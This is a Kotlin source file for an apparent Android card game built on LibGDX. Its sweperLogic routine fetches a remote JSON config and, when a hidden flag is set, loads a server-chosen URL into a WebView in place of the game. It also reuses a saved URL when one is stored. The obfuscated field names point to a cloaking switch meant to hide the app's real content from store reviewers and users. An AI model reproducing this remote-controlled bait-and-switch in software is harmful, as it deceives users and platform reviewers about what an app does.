package com.bonanza.sweetcards.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.utils.ScreenUtils
import com.bonanza.sweetcards.game.manager.NavigationManager
import com.bonanza.sweetcards.game.screens.LoaderScreen
import com.bonanza.sweetcards.game.util.advanced.AdvancedGame
import com.bonanza.sweetcards.MainActivity
import com.bonanza.sweetcards.appContext
import com.bonanza.sweetcards.util.Gist
import com.bonanza.sweetcards.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

lateinit var game: LibGDXGame private set


var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame = false

var GDX_ORIGINAL_LINK = ""
    private set

class LibGDXGame(val activity: MainActivity) : AdvancedGame() {


    lateinit var assetManager: AssetManager private set

    val coroutine = CoroutineScope(Dispatchers.Default)
    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Slemon", MODE_PRIVATE)

    override fun create() {
        game = this
        assetManager = AssetManager()

        NavigationManager.navigate(LoaderScreen())

        sweperLogic()
    }

    val back = Color.valueOf("E29CB0")
    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(back)
        super.render()
    }

    override fun dispose() {
        super.dispose()
        coroutine.cancel()
        assetManager.dispose()
    }


    // Logic Web ---------------------------------------------------------------------------

    private fun sweperLogic() {
        log("sweperLogic")
        activity.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.initWeb(activity.binding.webView)

        //GDX_GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("Medusa", "osenog") ?: "osenog"

        try {
            if (path == "osenog") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.apartment == "true") {
                            GDX_ORIGINAL_LINK = getJSON.glad
                            activity.loadUrl(GDX_ORIGINAL_LINK)

                            //GDX_ORIGINAL_LINK = "https://www.google.test"
                            //activity.loadUrl("https://www.google.com/")
                        } else {
                            GDX_GLOBAL_isGame = true
                        }

                        //coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("True", link).apply() }
                        //activity.loadUrl(link)

                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.loadUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }
    }

}